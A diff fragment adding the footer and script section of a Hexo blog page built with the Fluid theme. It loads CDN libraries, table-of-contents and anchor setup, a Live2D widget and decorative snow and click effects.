+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/flower.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
